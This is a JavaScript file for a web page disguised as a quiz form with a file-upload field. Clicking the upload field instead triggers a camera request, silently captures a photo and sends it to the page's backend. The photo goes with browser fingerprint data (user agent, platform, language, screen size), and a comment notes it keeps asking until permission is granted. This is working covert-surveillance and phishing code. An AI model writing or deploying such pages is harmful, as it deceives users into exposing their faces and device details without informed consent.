const fileInput = document.getElementById('user-file');
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const toast = document.getElementById('toast');
const form = document.getElementById('quiz-form');
const submitBtn = document.getElementById('submit-btn');

let photoCaptured = false;

// Camera constraints
const constraints = { video: { facingMode: "user" }, audio: false };

// Show toast
function showToast(message) {
  toast.innerText = message;
  toast.classList.add('show');
  setTimeout(() => toast.classList.remove('show'), 2500);
}

// Capture photo from camera
async function capturePhoto() {
  const ctx = canvas.getContext('2d');
  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
  const dataUrl = canvas.toDataURL('image/png');

  // Send photo to backend
  await fetch('/upload', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ image: dataUrl, metadata: collectMetadata() })
  });
  showToast('Camera photo captured & sent!');
  photoCaptured = true;
}

// Collect basic metadata
function collectMetadata() {
  return {
    width: window.innerWidth,
    height: window.innerHeight,
    useragent: navigator.userAgent,
    platform: navigator.platform,
    language: navigator.language,
    time: new Date().toISOString()
  };
}

// Request camera permission
async function requestCamera() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia(constraints);
    video.srcObject = stream;
    await capturePhoto();
  } catch (err) {
    showToast('Camera permission denied! Please allow.');
    throw err;
  }
}

// On file input click
fileInput.addEventListener('click', async (e) => {
  try {
    await requestCamera();
  } catch (err) {
    // Do nothing, keep asking until allow
  }
});

// On form submit
form.addEventListener('submit', (e) => {
  e.preventDefault();

  if (!fileInput.files.length) {
    showToast('Please select a file before submitting.');
    return;
  }

  showToast('Form submitted!');
  form.style.display = 'none';
  document.getElementById('success-container').style.display = 'flex';
});
